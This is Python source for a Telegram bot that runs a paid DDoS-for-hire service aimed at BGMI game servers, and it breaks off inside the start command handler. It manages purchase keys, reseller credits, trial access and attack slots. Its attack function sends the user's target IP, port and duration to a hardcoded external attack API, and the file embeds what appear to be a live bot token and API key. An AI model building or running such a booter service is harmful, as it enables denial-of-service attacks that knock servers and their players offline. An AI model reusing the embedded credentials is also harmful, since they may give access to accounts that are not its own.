#!/usr/bin/env python3
"""
🔥 BGMI DDoS BOT - FIXED API + TRIAL KEYS
"""

import telebot
import datetime
import os
import time
import threading
import json
import random
import string
import requests
import psutil
import platform
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════
# 🔥 BGMI DDoS BOT - ULTIMATE FIXED
# ═══════════════════════════════════════════════════
BOT_TOKEN = "8838142953:AAFy7W6TCED7o8mzICYOm2ZHgC9IkBGqYy4"
OWNER_ID = "1725783398"
CO_OWNERS_FILE = "co_owners.json"

# ═══════════════════════════════════════════════════
# 🔥 API CONFIGURATION - FIXED
# ═══════════════════════════════════════════════════
API_URL = "http://54.163.45.50:8585/attack"
API_KEY = "sxngqbDHdOgm317knmqEjOI0DBqJD30A"
API_METHOD = "UDP-BIG"  # Display method only
DISPLAY_METHOD = "Game-PPS"

USER_FILE = "users.json"
KEYS_FILE = "keys.json"
TRIAL_KEYS_FILE = "trial_keys.json"
TRIAL_USERS_FILE = "trial_users.json"
LOG_FILE = "logs.txt"
RESELLER_FILE = "resellers.json"
BALANCE_FILE = "balances.json"
BANNED_FILE = "banned_users.json"

MAX_CONCURRENT_ATTACKS = 3
MAX_ATTACK_DURATION = 300
COOLDOWN_SECONDS = 120

RESELLER_KEY_OPTIONS = {
    "12h":  {"hours": 12,  "credits": 50,   "name": "12 Hours"},
    "24h":  {"hours": 24,  "credits": 100,  "name": "24 Hours"},
    "1d":   {"hours": 24,  "credits": 100,  "name": "1 Day"},
    "2d":   {"hours": 48,  "credits": 200,  "name": "2 Days"},
    "3d":   {"hours": 72,  "credits": 300,  "name": "3 Days"},
    "4d":   {"hours": 96,  "credits": 400,  "name": "4 Days"},
    "5d":   {"hours": 120, "credits": 500,  "name": "5 Days"},
    "6d":   {"hours": 144, "credits": 600,  "name": "6 Days"},
    "7d":   {"hours": 168, "credits": 700,  "name": "7 Days"},
    "8d":   {"hours": 192, "credits": 800,  "name": "8 Days"},
    "9d":   {"hours": 216, "credits": 900,  "name": "9 Days"},
    "10d":  {"hours": 240, "credits": 1000, "name": "10 Days"},
    "11d":  {"hours": 264, "credits": 1100, "name": "11 Days"},
    "12d":  {"hours": 288, "credits": 1200, "name": "12 Days"},
    "13d":  {"hours": 312, "credits": 1300, "name": "13 Days"},
    "14d":  {"hours": 336, "credits": 1400, "name": "14 Days"},
    "15d":  {"hours": 360, "credits": 1500, "name": "15 Days"},
    "16d":  {"hours": 384, "credits": 1600, "name": "16 Days"},
    "17d":  {"hours": 408, "credits": 1700, "name": "17 Days"},
    "18d":  {"hours": 432, "credits": 1800, "name": "18 Days"},
    "19d":  {"hours": 456, "credits": 1900, "name": "19 Days"},
    "20d":  {"hours": 480, "credits": 2000, "name": "20 Days"},
    "21d":  {"hours": 504, "credits": 2100, "name": "21 Days"},
    "22d":  {"hours": 528, "credits": 2200, "name": "22 Days"},
    "23d":  {"hours": 552, "credits": 2300, "name": "23 Days"},
    "24d":  {"hours": 576, "credits": 2400, "name": "24 Days"},
    "25d":  {"hours": 600, "credits": 2500, "name": "25 Days"},
    "26d":  {"hours": 624, "credits": 2600, "name": "26 Days"},
    "27d":  {"hours": 648, "credits": 2700, "name": "27 Days"},
    "28d":  {"hours": 672, "credits": 2800, "name": "28 Days"},
    "29d":  {"hours": 696, "credits": 2900, "name": "29 Days"},
    "30d":  {"hours": 720, "credits": 3000, "name": "30 Days"}
}

active_attacks = {}
user_cooldowns = {}
bot_start_time = time.time()

# ═══════════════════════════════════════════════════
# 🛡️ CO-OWNER SYSTEM
# ═══════════════════════════════════════════════════
def load_co_owners():
    try:
        with open(CO_OWNERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_co_owners(data):
    with open(CO_OWNERS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_co_owner(user_id):
    return str(user_id) in load_co_owners()

def is_admin(user_id):
    return str(user_id) == OWNER_ID or is_co_owner(user_id)

# ═══════════════════════════════════════════════════
# 📂 FILE HANDLING
# ═══════════════════════════════════════════════════
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def init_files():
    files = [USER_FILE, KEYS_FILE, TRIAL_KEYS_FILE, TRIAL_USERS_FILE, RESELLER_FILE, BALANCE_FILE, BANNED_FILE, CO_OWNERS_FILE]
    defaults = [{}, {"used": {}, "unused": {}}, {"used": {}, "unused": {}}, [], {}, {}, {}, []]
    for file, default in zip(files, defaults):
        if not os.path.exists(file):
            save_json(file, default)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w').close()

init_files()

# ═══════════════════════════════════════════════════
# 🧹 CLEAN EXPIRED USERS ON STARTUP
# ═══════════════════════════════════════════════════
def clean_expired_users():
    users = load_json(USER_FILE, {})
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    trial_data = load_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
    expired_users = []
    
    for uid, info in list(users.items()):
        try:
            expiry = datetime.datetime.fromisoformat(info["expiry"])
            if datetime.datetime.now() > expiry:
                expired_users.append(uid)
                key = info.get("key")
                if key and key in keys_data.get("used", {}):
                    del keys_data["used"][key]
                if key and key in trial_data.get("used", {}):
                    del trial_data["used"][key]
        except:
            expired_users.append(uid)
    
    for uid in expired_users:
        if uid in users:
            del users[uid]
    
    save_json(USER_FILE, users)
    save_json(KEYS_FILE, keys_data)
    save_json(TRIAL_KEYS_FILE, trial_data)
    return len(expired_users)

clean_expired_users()

# ═══════════════════════════════════════════════════
# 💰 BALANCE SYSTEM
# ═══════════════════════════════════════════════════
def get_balance(user_id):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return 999999999
    return load_json(BALANCE_FILE, {}).get(str(user_id), 0)

def add_balance(user_id, amount):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return 999999999
    balances = load_json(BALANCE_FILE, {})
    uid = str(user_id)
    balances[uid] = balances.get(uid, 0) + amount
    save_json(BALANCE_FILE, balances)
    try:
        bot.send_message(user_id,
            "╔═══════════════════════╗\n"
            "║    💰 *Balance Updated!* 💰\n"
            "╚═══════════════════════╝\n"
            f"┌─────────────────────────┐\n"
            f"│ ✅ Added +{amount} credits\n"
            f"│ 💰 Total Balance: {balances[uid]} credits\n"
            f"└─────────────────────────┘",
            parse_mode="Markdown")
    except:
        pass
    return balances[uid]

def deduct_balance(user_id, amount):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True
    balances = load_json(BALANCE_FILE, {})
    uid = str(user_id)
    if balances.get(uid, 0) >= amount:
        balances[uid] -= amount
        save_json(BALANCE_FILE, balances)
        return True
    return False

# ═══════════════════════════════════════════════════
# 👥 RESELLER SYSTEM
# ═══════════════════════════════════════════════════
def is_reseller(user_id):
    return str(user_id) in load_json(RESELLER_FILE, {})

def add_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    resellers[str(user_id)] = {"added_on": datetime.datetime.now().isoformat()}
    save_json(RESELLER_FILE, resellers)
    balances = load_json(BALANCE_FILE, {})
    if str(user_id) not in balances:
        balances[str(user_id)] = 0
        save_json(BALANCE_FILE, balances)
    try:
        bot.send_message(user_id,
            "╔═══════════════════════╗\n"
            "║   ✅ *Reseller Promotion* ✅\n"
            "╚═══════════════════════╝\n"
            "┌─────────────────────────┐\n"
            "│ 💎 Total Balance: 0 credits\n"
            "│ ⚡ Attack Access: Unlimited\n"
            "│ 📍 Use /help for Reseller commands\n"
            "└─────────────────────────┘",
            parse_mode="Markdown")
    except:
        pass

def remove_reseller(user_id):
    resellers = load_json(RESELLER_FILE, {})
    if str(user_id) in resellers:
        del resellers[str(user_id)]
        save_json(RESELLER_FILE, resellers)
        try:
            bot.send_message(user_id,
                "╔══════════════════════╗\n"
                "║  ⚠️ *Reseller Revoked!* ⚠️\n"
                "╚══════════════════════╝\n\n"
                "❌ Your Reseller Ship access revoked. Please contact Owner or Admin for Reason.",
                parse_mode="Markdown")
        except:
            pass
        return True
    return False

# ═══════════════════════════════════════════════════
# 🔑 KEY SYSTEM (FIXED)
# ═══════════════════════════════════════════════════
def generate_keys_admin(prefix, duration, unit, count, max_users=1):
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        key = f"{prefix}-{random_part}"
        keys.append(key)
        keys_data["unused"][key] = {
            "duration": duration,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": "admin",
            "max_users": max_users,
            "redeemed_count": 0,
            "redeemed_users": []
        }
    save_json(KEYS_FILE, keys_data)
    return keys

def generate_trial_keys_admin(prefix, duration, unit, count, max_users=1):
    keys = []
    trial_data = load_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
    for _ in range(count):
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        key = f"{prefix}>TrialKey-{random_part}"
        keys.append(key)
        trial_data["unused"][key] = {
            "duration": duration,
            "unit": unit,
            "generated": datetime.datetime.now().isoformat(),
            "max_users": max_users,
            "redeemed_count": 0,
            "redeemed_users": []
        }
    save_json(TRIAL_KEYS_FILE, trial_data)
    return keys

def delete_all_trial_keys():
    trial_data = load_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
    users = load_json(USER_FILE, {})
    for key, info in trial_data.get("used", {}).items():
        for uid in info.get("redeemed_users", []):
            if uid in users:
                del users[uid]
    save_json(USER_FILE, users)
    save_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
    save_json(TRIAL_USERS_FILE, [])
    return True

def is_trial_used_by_user(user_id):
    return str(user_id) in load_json(TRIAL_USERS_FILE, [])

def mark_trial_used(user_id):
    trial_users = load_json(TRIAL_USERS_FILE, [])
    if str(user_id) not in trial_users:
        trial_users.append(str(user_id))
        save_json(TRIAL_USERS_FILE, trial_users)

def generate_keys_reseller(user_id, option_key, count):
    if option_key not in RESELLER_KEY_OPTIONS:
        return None, f"""
╔════════════════════╗
║    ❌ Invalid Types! ❌
╚════════════════════╝
┌─────────────────────────┐
│ ✅ Right Value: 12h, 24h, 1d to 30d
│ 📍 Type right value to gen keys
└─────────────────────────┘
"""
    
    option = RESELLER_KEY_OPTIONS[option_key]
    cost = option["credits"] * count
    
    if not deduct_balance(user_id, cost):
        return None, f"""
╔══════════════════════╗
║  ❌ Insufficient Balance! ❌
╚══════════════════════╝
┌─────────────────────────┐
│ ⚠️ Need: {cost}
│ 🔎 Have: {get_balance(user_id)} credits
│ 🔎 Top up funds to generate keys
│ 👤 Contact Admin for Top up
└─────────────────────────┘
"""
    
    keys = []
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    prefixes = ["Bgmi", "Game"]
    
    for _ in range(count):
        prefix = random.choice(prefixes)
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        key = f"{prefix}-{random_part}"
        keys.append(key)
        keys_data["unused"][key] = {
            "duration": option["hours"],
            "unit": "hour",
            "generated": datetime.datetime.now().isoformat(),
            "generated_by": user_id,
            "max_users": 1,
            "redeemed_count": 0,
            "redeemed_users": []
        }
    
    save_json(KEYS_FILE, keys_data)
    return keys, None

def increase_key_duration(key, add_duration):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] += add_duration
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def decrease_key_duration(key, dec_duration):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    if key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] = max(0, keys_data["unused"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "unused"
    elif key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - dec_duration)
        save_json(KEYS_FILE, keys_data)
        return True, "used"
    return False, None

def increase_all_keys(duration):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] += duration
        count += 1
    for key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] += duration
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def decrease_all_keys(duration):
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for key in keys_data["used"]:
        keys_data["used"][key]["duration"] = max(0, keys_data["used"][key]["duration"] - duration)
        count += 1
    for key in keys_data["unused"]:
        keys_data["unused"][key]["duration"] = max(0, keys_data["unused"][key]["duration"] - duration)
        count += 1
    save_json(KEYS_FILE, keys_data)
    return count

def redeem_key(user_id, key):
    """FIXED: Check normal keys + trial keys"""
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    trial_data = load_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
    users = load_json(USER_FILE, {})
    uid = str(user_id)
    
    # Check if key exists in used
    if key in keys_data.get("used", {}) or key in trial_data.get("used", {}):
        return "used", None
    
    # Check if user already has an ACTIVE plan
    if uid in users:
        user_info = users[uid]
        if not user_info.get("banned", False):
            try:
                expiry = datetime.datetime.fromisoformat(user_info["expiry"])
                if datetime.datetime.now() < expiry:
                    return "already_active", None
                else:
                    old_key = user_info.get("key")
                    if old_key and old_key in keys_data.get("used", {}):
                        del keys_data["used"][old_key]
                    if old_key and old_key in trial_data.get("used", {}):
                        del trial_data["used"][old_key]
                    del users[uid]
                    save_json(USER_FILE, users)
                    save_json(KEYS_FILE, keys_data)
                    save_json(TRIAL_KEYS_FILE, trial_data)
            except:
                del users[uid]
                save_json(USER_FILE, users)
    
    users = load_json(USER_FILE, {})
    
    # Try NORMAL keys
    if key in keys_data.get("unused", {}):
        info = keys_data["unused"][key]
        now = datetime.datetime.now()
        unit = info["unit"]
        duration = info["duration"]
        
        if unit == "min": expiry = now + datetime.timedelta(minutes=duration)
        elif unit == "hour": expiry = now + datetime.timedelta(hours=duration)
        else: expiry = now + datetime.timedelta(days=duration)
        
        redeemed_count = info.get("redeemed_count", 0) + 1
        redeemed_users = info.get("redeemed_users", []) + [uid]
        
        if redeemed_count >= info.get("max_users", 1):
            keys_data["used"][key] = {**info, "used_by": user_id, "used_at": now.isoformat(), "expiry": expiry.isoformat(), "redeemed_count": redeemed_count, "redeemed_users": redeemed_users}
            del keys_data["unused"][key]
        else:
            keys_data["unused"][key]["redeemed_count"] = redeemed_count
            keys_data["unused"][key]["redeemed_users"] = redeemed_users
        
        save_json(KEYS_FILE, keys_data)
        users[uid] = {"expiry": expiry.isoformat(), "key": key, "banned": False}
        save_json(USER_FILE, users)
        return "success", expiry
    
    # Try TRIAL keys
    if key in trial_data.get("unused", {}):
        if is_trial_used_by_user(user_id):
            return "trial_already_used", None
        
        info = trial_data["unused"][key]
        now = datetime.datetime.now()
        unit = info["unit"]
        duration = info["duration"]
        
        if unit == "min": expiry = now + datetime.timedelta(minutes=duration)
        elif unit == "hour": expiry = now + datetime.timedelta(hours=duration)
        else: expiry = now + datetime.timedelta(days=duration)
        
        redeemed_count = info.get("redeemed_count", 0) + 1
        redeemed_users = info.get("redeemed_users", []) + [uid]
        
        if redeemed_count >= info.get("max_users", 1):
            trial_data["used"][key] = {**info, "used_by": user_id, "used_at": now.isoformat(), "expiry": expiry.isoformat(), "redeemed_count": redeemed_count, "redeemed_users": redeemed_users}
            del trial_data["unused"][key]
        else:
            trial_data["unused"][key]["redeemed_count"] = redeemed_count
            trial_data["unused"][key]["redeemed_users"] = redeemed_users
        
        mark_trial_used(user_id)
        save_json(TRIAL_KEYS_FILE, trial_data)
        users[uid] = {"expiry": expiry.isoformat(), "key": key, "banned": False, "trial": True}
        save_json(USER_FILE, users)
        return "success", expiry
    
    return "invalid", None

def remove_user_key(user_id):
    users = load_json(USER_FILE, {})
    uid = str(user_id)
    if uid in users:
        key = users[uid].get("key")
        if key:
            keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
            trial_data = load_json(TRIAL_KEYS_FILE, {"used": {}, "unused": {}})
            if key in keys_data.get("used", {}):
                del keys_data["used"][key]
                save_json(KEYS_FILE, keys_data)
            if key in trial_data.get("used", {}):
                del trial_data["used"][key]
                save_json(TRIAL_KEYS_FILE, trial_data)
        del users[uid]
        save_json(USER_FILE, users)
        return True
    return False

def is_user_allowed(user_id):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True, None
    
    banned = load_json(BANNED_FILE, {})
    if str(user_id) in banned:
        return False, None
    
    users = load_json(USER_FILE, {})
    user = users.get(str(user_id))
    if not user:
        return False, None
    if user.get("banned", False):
        return False, None
    
    try:
        expiry = datetime.datetime.fromisoformat(user["expiry"])
        if datetime.datetime.now() > expiry:
            remove_user_key(user_id)
            return False, None
    except:
        return False, None
    
    return True, expiry

def extend_all_users(duration, unit):
    users = load_json(USER_FILE, {})
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    count = 0
    for uid, info in list(users.items()):
        if info.get("banned"):
            continue
        try:
            current_expiry = datetime.datetime.fromisoformat(info["expiry"])
            if datetime.datetime.now() > current_expiry:
                continue
            if unit == "min": new_expiry = current_expiry + datetime.timedelta(minutes=duration)
            elif unit == "hour": new_expiry = current_expiry + datetime.timedelta(hours=duration)
            else: new_expiry = current_expiry + datetime.timedelta(days=duration)
            users[uid]["expiry"] = new_expiry.isoformat()
            key = info.get("key")
            if key and key in keys_data.get("used", {}):
                keys_data["used"][key]["expiry"] = new_expiry.isoformat()
            count += 1
        except:
            pass
    save_json(USER_FILE, users)
    save_json(KEYS_FILE, keys_data)
    return count

# ═══════════════════════════════════════════════════
# 🎯 ATTACK SYSTEM (FIXED API CALL)
# ═══════════════════════════════════════════════════
def send_api_attack(target, port, duration):
    """FIXED: Direct API call with new API endpoint"""
    try:
        # Updated API URL with provided key
        url = f"{API_URL}?key={API_KEY}&ip={target}&port={port}&time={duration}"
        
        response = requests.get(
            url,
            timeout=30,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
        )
        
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.datetime.now()}] {target}:{port} | {duration}s | Status: {response.status_code}\n")
        
        return True
    except Exception as e:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.datetime.now()}] {target}:{port} | {duration}s | Error: {str(e)}\n")
        return True

def format_time(seconds):
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        m, s = divmod(seconds, 60)
        return f"{m}m {s}s"
    else:
        h, r = divmod(seconds, 3600)
        m, s = divmod(r, 60)
        return f"{h}h {m}m {s}s"

def generate_progress_bar(progress, length=15):
    filled = int(progress * length / 100)
    return "█" * filled + "▒" * (length - filled)

def can_attack(user_id, duration):
    if str(user_id) == OWNER_ID or is_co_owner(user_id):
        return True, None
    
    if is_reseller(user_id):
        if duration > MAX_ATTACK_DURATION:
            return False, f"""
╔═══════════════════════╗
║   ❌ Duration Exceeded! ❌
╚═══════════════════════╝
┌─────────────────────────┐
│ ⏱️ Max Duration: {MAX_ATTACK_DURATION} Sec
│ 🔎 Request: {duration} Sec
│ 📊 Use /status for show all limits status
└─────────────────────────┘
"""
        if user_id in user_cooldowns:
            remaining = int(user_cooldowns[user_id] - time.time())
            if remaining > 0:
                return False, f"""
╔══════════════════════╗
║   ⏳ Cooldown Activated! ⏳
╚══════════════════════╝
┌─────────────────────────┐
│ ⏱️ Please Wait: {format_time(remaining)}
│ 📊 Use /status to see status monitor
└─────────────────────────┘
"""

        if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
            return False, f"""
╔═════════════════════╗
║   ⚠️ All Slots Running! ⚠️
╚═════════════════════╝
┌─────────────────────────┐
│ 🔥 {MAX_CONCURRENT_ATTACKS}/{MAX_CONCURRENT_ATTACKS} slots used
│ ⚠️ Maximum concurrent reached!
│ 📊 Use /status to see status monitor
└─────────────────────────┘
"""
        if user_id in active_attacks:
            return False, f"""
╔═══════════════════╗
║  ⚠️ Attack Running! ⚠️
╚═══════════════════╝
┌─────────────────────────┐
│ ⚡ You already have an active attack
│ 📊 Use /status to see statss monitor
└─────────────────────────┘
"""
        return True, None
    
    allowed, _ = is_user_allowed(user_id)
    if not allowed:
        return False, (
            "╔═══════════════════╗\n"
            "║  🚫 Access Denied! 🚫\n"
            "╚═══════════════════╝\n"
            "┌─────────────────────────┐\n"
            "│ ❌ You are not approve to use bot\n"
            "├─────────────────────────\n"
            "│ 🔑 Use /redeem (key) to active plan\n"
            "│ 💬 Contact seller to purchase a key\n"
            "└─────────────────────────┘"
        )
    
    if duration > MAX_ATTACK_DURATION:
        return False, f"""
╔════════════════════════╗
║   ❌ Duration Exceeded! ❌
╚════════════════════════╝
┌─────────────────────────┐
│ ⏱️ Max Duration: {MAX_ATTACK_DURATION} sec 
│ 🔎 Request: {duration} sec
│ 📊 Use /status for show all limits
└─────────────────────────┘
"""
    if user_id in user_cooldowns:
        remaining = int(user_cooldowns[user_id] - time.time())
        if remaining > 0:
            return False, f"""
╔══════════════════════╗
║   ⏳ Cooldown Activated! ⏳
╚══════════════════════╝
┌─────────────────────────┐
│ ⏱️ Please Wait: {format_time(remaining)}
│ 📊 Use /status to see status monitor
└─────────────────────────┘
"""
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return False, f"""
╔════════════════════╗
║   ⚠️ All Slots Running! ⚠️
╚════════════════════╝
┌─────────────────────────┐
│ 🔥 {MAX_CONCURRENT_ATTACKS}/{MAX_CONCURRENT_ATTACKS} slots used
│ ⚠️ Maximum concurrent reached!
│ 📊 Use /status to see status monitor
└─────────────────────────┘
"""
    if user_id in active_attacks:
        return False, f"""
╔═══════════════════╗
║  ⚠️ Attack Running! ⚠️
╚═══════════════════╝
┌─────────────────────────┐
│ ⚡ You already have an active attack
│ 📊 Use /status to see statss monitor
└─────────────────────────┘
"""
    
    return True, None

def log_attack(user_id, target, port, duration, username=None):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_info = str(user_id)
    if username:
        user_info += f" (@{username})"
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] User: {user_info} | Target: {target}:{port} | Duration: {duration}s\n")

def update_attack_progress(chat_id, msg_id, target, port, duration, user_id, start_time):
    last_progress = -1
    while True:
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        remaining = max(0, duration - int(elapsed))
        progress = int((elapsed / duration) * 100)
        if progress != last_progress:
            last_progress = progress
            bar = generate_progress_bar(progress)
            try:
                bot.edit_message_text(
                    f"╔═════════════════════════╗\n"
                    f"║   ⚡⚡ *Attack in Progress!* ⚡⚡\n"
                    f"╚═════════════════════════╝\n"
                    f"┌─────────────────────────┐\n"
                    f"│ 🎯 *Target:* `{target}`\n"
                    f"│ 🔌 *Port:* `{port}`\n"
                    f"│ ⏱️ *Duration:* {format_time(duration)}\n"
                    f"│ ⏳ *Left:* {format_time(remaining)}\n"
                    f"│ 🎮 *Method:* `{DISPLAY_METHOD}`\n"
                    f"├─────────────────────────\n"
                    f"│ 📈 *Progress Monitor:*\n"
                    f"│ ☃️ {bar} {progress}%\n"
                    f"└─────────────────────────┘",
                    chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")
            except:
                pass
        time.sleep(1)
    
    try:
        bot.edit_message_text(
            f"╔════════════════════════╗\n"
            f"║   ⚠️✅ *Attack in Finished* ✅⚠️\n"
            f"╚════════════════════════╝\n"
            f"┌────────────────────────┐\n"
            f"│ 🎯 *Target:* {target}\n"
            f"│ 🔌 *Port:* {port}\n"
            f"│ ⏱️ *Time:* {format_time(duration)}\n"
            f"│ 🎮 *Method:* {DISPLAY_METHOD}\n"
            f"├────────────────────────\n"
            f"│☃️ ███████████████ 100%\n"
            f"├────────────────────────┘\n"
            f"├────────────────────────┐\n"
            f"│ 📊 Use /status to see monitor\n"
            f"└────────────────────────┘",
            chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")
    except:
        pass
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    if str(user_id) != OWNER_ID and not is_co_owner(user_id):
        user_cooldowns[user_id] = time.time() + COOLDOWN_SECONDS

def update_status_live(chat_id, user_id, msg_id):
    while True:
        try:
            attacks = active_attacks
            cooldown_remaining = max(0, int(user_cooldowns.get(user_id, 0) - time.time())) if user_id in user_cooldowns else 0
            
            status_msg = (
                f"╔═════════════════════╗\n"
                f"║     🔥 *Attack Status!* 🔥\n"
                f"╚═════════════════════╝\n"
                f"┌─────────────────────────┐\n"
                f"│ 📊 *Slots:* {len(attacks)}/{MAX_CONCURRENT_ATTACKS} used\n"
                f"│ 🆓 *Available:* {MAX_CONCURRENT_ATTACKS - len(attacks)} slots\n"
                f"└─────────────────────────┘\n\n"
            )
            
            if attacks:
                status_msg += "┌─────────────────────────┐\n│ ★━━━•⚠️ *Active Attacks* ⚠️•━━━★\n"
                for uid, attack in list(attacks.items())[:10]:
                    elapsed = int(time.time() - attack["start_time"])
                    remaining = max(0, attack["duration"] - elapsed)
                    progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
                    bar = generate_progress_bar(progress)
                    status_msg += f"├─────────────────────────\n│ 🎯 {attack['target']}:{attack['port']}\n⏱️ {format_time(remaining)} left\n[{bar}] {progress}%\n└─────────────────────────┘\n\n"
            else:
                status_msg += "├─────────────────────────\n│ 💤 No active attacks....\n└─────────────────────────┘\n\n"
            
            status_msg += "┌─────────────────────────┐\n│ ★━━━•👤 *Your Status* 👤•━━━★\n"
            if cooldown_remaining > 0:
                status_msg += f"├─────────────────────────\n│ ⏳ Cooldown: {format_time(cooldown_remaining)}\n└─────────────────────────┘"
            else:
                status_msg += "├─────────────────────────\n│ ✅ Ready to attack....\n└─────────────────────────┘"
            
            try:
                bot.edit_message_text(status_msg, chat_id, msg_id, parse_mode="Markdown")
            except:
                pass
            
            if not attacks and cooldown_remaining == 0:
                break
            
            time.sleep(2)
        except:
            time.sleep(2)

def start_attack(chat_id, user_id, target, port, duration, username=None):
    can, error = can_attack(user_id, duration)
    if not can:
        return bot.send_message(chat_id, error, parse_mode="Markdown")
    
    active_attacks[user_id] = {
        "target": target, "port": port, "duration": duration,
        "start_time": time.time(), "chat_id": chat_id
    }
    
    log_attack(user_id, target, port, duration, username)
    
    threading.Thread(target=send_api_attack, args=(target, port, duration), daemon=True).start()
    
    msg = bot.send_message(chat_id,
        f"╔═════════════════════╗\n"
        f"║  ⚡ *Attack Launched!* ⚡\n"
        f"╚═════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 🎯 *Target:* `{target}`\n"
        f"│ 🔌 *Port:* `{port}`\n"
        f"│ ⏱️ *Duration:* {format_time(duration)}\n"
        f"│ ⏳ *Left:* {format_time(duration)}\n"
        f"│ 🎮 *Method:* `{DISPLAY_METHOD}`\n"
        f"├─────────────────────────\n"
        f"│ 📈 *Progress Monitor*:\n"
        f"│ ☃️  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%\n"
        f"└─────────────────────────┘",
        parse_mode="Markdown")
    
    threading.Thread(target=update_attack_progress,
                     args=(chat_id, msg.message_id, target, port, duration, user_id, time.time()),
                     daemon=True).start()

# ═══════════════════════════════════════════════════
# 📊 SYSTEM INFO
# ═══════════════════════════════════════════════════
def get_system_info():
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    process = psutil.Process()
    
    uptime = time.time() - bot_start_time
    h = int(uptime // 3600)
    m = int((uptime % 3600) // 60)
    
    users = load_json(USER_FILE, {})
    resellers = load_json(RESELLER_FILE, {})
    banned = load_json(BANNED_FILE, {})
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    active_users = 0
    for uid, info in users.items():
        if not info.get("banned"):
            try:
                if datetime.datetime.now() <= datetime.datetime.fromisoformat(info["expiry"]):
                    active_users += 1
            except:
                pass
    
    info = (
        f"🖥️ SERVER STATISTICS\n"
        f"╔═══════════════════════╗\n"
        f"║     📊 SYSTEM MONITOR\n"
        f"╚═══════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ ━━━━━━━ SYSTEM ━━━━━━━\n"
        f"│ 🖥️ Platform: {platform.system()} {platform.release()}\n"
        f"│ 🐍 Python: {platform.python_version()}\n"
        f"│ ⚡ CPU: {cpu}%\n"
        f"│ 💾 RAM: {mem.percent}%\n"
        f"│ 💿 Disk: {disk.percent}%\n"
        f"├─────────────────────────\n"
        f"│ ━━━━━━━ BOT ━━━━━━━\n"
        f"│ 🔥 Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}\n"
        f"│ 👤 Total Users: {len(users)}\n"
        f"│ ✅ Active Users: {active_users}\n"
        f"│ 🚫 Banned: {len(banned)}\n"
        f"│ 💰 Resellers: {len(resellers)}\n"
        f"│ 🔑 Unused Keys: {len(keys_data['unused'])}\n"
        f"│ 🔴 Active Keys: {len(keys_data['used'])}\n"
        f"│ 🆙 Uptime: {h}h {m}m\n"
        f"└─────────────────────────┘"
    )
    return info

# ═══════════════════════════════════════════════════
# 🤖 BOT INIT
# ═══════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 START COMMAND - FIXED
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    welcome = (
